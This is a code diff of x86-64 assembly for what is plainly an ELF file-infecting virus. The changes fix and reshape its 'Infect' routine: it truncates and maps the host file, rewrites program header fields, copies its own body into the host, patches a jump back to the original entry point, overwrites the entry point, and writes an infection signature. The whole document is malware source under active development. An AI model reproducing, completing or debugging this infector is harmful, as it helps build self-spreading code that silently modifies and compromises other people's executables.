@@ -10,6 +10,8 @@
 ;       to experiment by approaching ASM like an high-level
 ;       language, thus making it *hopefully* more readable
 ;       for people unfamiliar with ASM.
+;
+; Todo: Write self at correct offset (use fseek)
 
 %include "src/Macros.asm"
 %include "src/Structs.asm"
@@ -119,13 +121,17 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   add     rbx,  0xFFF                 ; add page_size-1
   and     rbx,  -0x1000
 
+  ; fseek(rdi, 0, SEEK_END) ; <-- get & save old EOF
+  ; ...
+
   xor     rsi,  rsi
   FTruncate     rdi,  rbx
   test    rax,  rax
   jne     .InfectExit
 
-  sub     rsp,  0x20
+  sub     rsp,  0x28
   push    rbx
+  push    r10
   push    r9
   push    rdi
 
@@ -134,6 +140,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   pop     rdi                         ; restore regs
   pop     r9
+  pop     r10
 
   test    rax,  rax                   ; check if mmap(...) failed
   js      .InfectExit
@@ -202,29 +209,30 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rcx,  rbx           ; rcx = size V-Body
 
   mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_filesz
-  mov   qword [r12 + elf64_phdr.p_filesz],  rcx       ; p_memsz
+  mov   qword [r12 + elf64_phdr.p_memsz],   rcx       ; p_memsz
 
-  mov   rbx,  [rsp + 0x8]
-  sub   rbx,  rcx           ; rbx = size H-Body
+  mov   qword [r12 + elf64_phdr.p_offset],  r10       ; p_offset
 
-  mov   qword [r12 + elf64_phdr.p_offset],  rbx       ; p_offset
-
-  mov   [rsp + 0x20], rbx
+  mov   rbx,  r10                                     ; rbx = size H-Body
+  mov   dword [rsp + 0x20], ebx
   add   rbx,  0xc000000
 
   mov   qword [r12 + elf64_phdr.p_vaddr],   rbx       ; p_vaddr
+  mov   qword [r12 + elf64_phdr.p_paddr],   rbx       ; p_paddr
+  mov   qword [r12 + elf64_phdr.p_align],   0x00      ; no alignment needed
 
   ;; WRITE SELF AT LOCATION >-----------------------------------------------<
 
   mov   rcx,  VExitRoutine
   mov   rbx,  _start
-  sub   rcx,  rbx           ; rcx = size V-Body
+  sub   rcx,  rbx             ; rcx = size V-Body
 
   sub   rsp,  0x8
   push  rdi
 
-  mov   rsi, _start         ; source address
-  mov   rdi, [rsp + 0x28]   ; destination address
+  mov   rsi, _start           ; source address
+  mov   rdi,  [rsp + 0x10]  
+  add   rdi,  r10             ; destination address
   rep   movsb
 
   pop   rdi
@@ -232,33 +240,28 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
   ;; WRITE OLD ENTRYPOINT AT SELF >-----------------------------------------<
 
-  ; NewEntry = GetRip() - (V_SIZE + 5) - V_Entry + OEP
-  call  GetRip                ; GetRip()
-  mov   rbx,  _start
-  mov   rcx,  VExitRoutine
-  sub   rcx,  rbx             ; V_Size
-  add   rcx,  0x5             ; V_Size + 5
-  sub   rax,  rcx             ; RIP - (V_Size+5)
-  lea   rbx,  [rsp + 0x18]
-  sub   rax,  [rbx + elf64_phdr.p_vaddr]
-  add   rax,  [rsp + 0x10]
-
   ; patch the jmp
-  lea   rbx,  [rsp]   
-  mov   byte  [rbx + rcx],  0xe9  ; jmp
-  inc   rcx
-  mov   dword [rbx + rcx],  eax   ; addr
+  mov   rcx,  VExitRoutine
+  mov   rbx,  _start
+  sub   rcx,  rbx           ; rcx = size V-Body
+
+  mov   rbx,  [rsp]   
+  add   rbx,  [rsp + 0x20]
+  add   rbx,  rcx
+
+  mov   byte  [rbx],  0xe9  ; jmp
+  mov   rax,  [rsp + 0x10]
+  mov   dword [rbx + 0x01],  eax   ; addr
 
   ;; OVERWRITE ENTRYPOINT >-------------------------------------------------<
 
-  mov   rbx,  [rsp + 0x20]
-  mov   rcx,  [rsp]
-  mov   [rcx + elf64_hdr.e_entry],    rbx       ; patch entry
+  mov   rbx,  r10
+  add   rbx,  0xc000000
+  mov   dword [rdx + elf64_hdr.e_entry], ebx       ; patch entry
   
   ;; WRITE SIGNATURE >------------------------------------------------------<
   
-  mov   rbx,  [rsp]
-  mov   dword [rbx + 0xC], 0x534e4700
+  mov   dword [rdx + 0xC], 0x534e4700
 
   ;; OVERWRITE FILE >-------------------------------------------------------<
 
@@ -266,7 +269,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   push  rdi
 
   ; msync(addr, len, MS_SYNC) 
-  MSync [rsp + 0x10], [rsp + 0x18], MS_SYNC
+  MSync rdx, [rsp + 0x18], MS_SYNC
 
   pop   rdi
   add   rsp,  0x8
@@ -304,10 +307,6 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   xor     rax,  rax
   mov     rsp,  rbp
   pop     rbp
-  ret
-
-GetRip:
-  mov     rax,  [rsp]
   ret
 
 VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
